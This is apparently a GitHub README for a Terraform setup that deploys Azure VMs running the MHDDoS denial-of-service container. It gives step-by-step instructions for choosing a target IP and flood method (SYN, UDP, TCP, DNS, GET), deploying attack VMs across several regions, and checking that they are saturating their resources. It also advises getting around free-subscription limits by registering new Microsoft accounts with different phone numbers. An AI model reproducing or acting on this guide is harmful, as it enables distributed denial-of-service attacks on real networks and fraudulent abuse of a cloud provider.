>Note! You're free to use this repo a way you want but pay attention to the legal liability you may have if you use this 
configuration without compliance with your local laws
# Overview
Here I use Terraform to automate Azure VM deployment which run MHDDOS docker container.
You can deploy VMs to any Azure region, I prefer those that are located in Asia.   
- Default region - `koreacentral` (Central Korea)
- Default VM count - `4` (In free Azure subscription it's allowed only 4 vCPUs in a single region)
- Default VM SKU - `Standard_F1s` (1 vCPU, 2 GiB RAM, accelerated networking - ON, price around 0.05 USD/hour)
- Default resource group - `mhddosGroup`  

To change default values you can amend the`variables.tf` file. To customize via terminal:
```shell
terraform apply ... -var="<variableName>=<variableValue>"
```

# Prerequisites

You must have a Microsoft Azure account, it's better off using a free subscription (200 USD for 30 days).
Also, installed azure CLI and terraform tools are required. To install these tools check out the following guides:
- Azure CLI https://docs.microsoft.com/en-us/cli/azure/install-azure-cli
- Terraform https://learn.hashicorp.com/tutorials/terraform/install-cli

In general, `udp/tcp/dns` mhddos attacks
are network intensive so your free subscription will be suspended after around 24 hours of active attacks. SYN mhddos attack doesn't require many network resources thus you can use your subscription
longer.  
After your subscription is over you can register a new Microsoft account and apply for a new free Azure
subscription. The main rule here is to specify different phone number. If you have any other ideas
or real experience on creating multiple Microsoft Azure free accounts - feel free to describe this here using a pull request.

# Getting started
1. Clone this repository:

```shell
git clone https://github.com/djebos/mhddos-azure-terraform.git
```

    
OR

Download zip archive of the repository and unzip it on your 
local machine into default directory `mhddos-azure-terraform`

2. Go into the downloaded repository directory

```shell
cd mhddos-azure-terraform/
```

3. Log in Azure in the repository folder
```shell
az login
```
4. Initialize terraform
```shell
terraform init
```
5. Select target and type of attack. Open the `cloud-init.yaml` file in any text editor. Find the `runcmd` attribute.  
`docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your 
customizations must follow this command as in example below:

```yaml
# TCP syn flood attack on ip 15.61.23.9, port 53, 100 threads, duration 999999 seconds
runcmd:
  - docker run --name mhddos --rm -d djebos/mhddos:latest syn 15.61.23.9:53 100 999999
# here 'syn 15.61.23.9:53 100 999999' is your attack configuration that fully compliant with original MHDDOS
```
More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)  
Save the `cloud-init.yaml` file.

6. Deploy to the specified azure region (you must be logged in through `az login`). Examples:  
```shell
terraform apply -state india.tfstate -var="location=southindia" -var="resource_group_name=mhddosIndia" -auto-approve
terraform apply -state korea.tfstate -var="location=koreacentral" -var="resource_group_name=mhddosKorea" -auto-approve
terraform apply -state japan.tfstate -var="location=japaneast" -var="resource_group_name=mhddosJapan" -auto-approve
```
7. Verify after a couple of minutes on azure portal the load of VMs' CPUs, RAM, network. CPU or RAM usage must be around 100%.  
In fact, load percentage depends on the attack method and its configuration such as proxying, threads or request per connection count. 
There isn't a silver bullet configuration and attack method that works perfectly on any target. You have to make some effort to figure out the best for every case. 
Good methods to start with: `TCP`,`UDP`, `SYN`, `GET`, `DNS`.  
8. Stop attack and destroy VMs. Examples:
```shell
terraform destroy -state india.tfstate -auto-approve
terraform destroy -state korea.tfstate -auto-approve
terraform destroy -state japan.tfstate -auto-approve
```
# Troubleshooting
Your attack could fail due to numerous reasons: wrong configuration, ip isn't reachable etc. Therefore, you 
have to connect to your VMs and figure things out. 
1. Refresh current terraform state:
```shell
terraform refresh -state <your_state_file>.tfstate
```
2. Find out the target VM's public ip through Azure Portal or using terminal
```shell
terraform output -state <your_state_file>.tfstate instancePublicIPs
```
3. Export a private key to the file:
```shell
terraform output -raw -state <your_state_file>.tfstate tls_private_key > <regionName>.pem
```
4. Add a read access to the key file:
```shell
chmod 400 <regionName>.pem
```
5. Connect via SSH:
```shell
ssh -i <regionName>.pem azureuser@<your_vm_IP>
```
6. Check a status of the `mhddos` docker container:
```shell
sudo docker ps
```

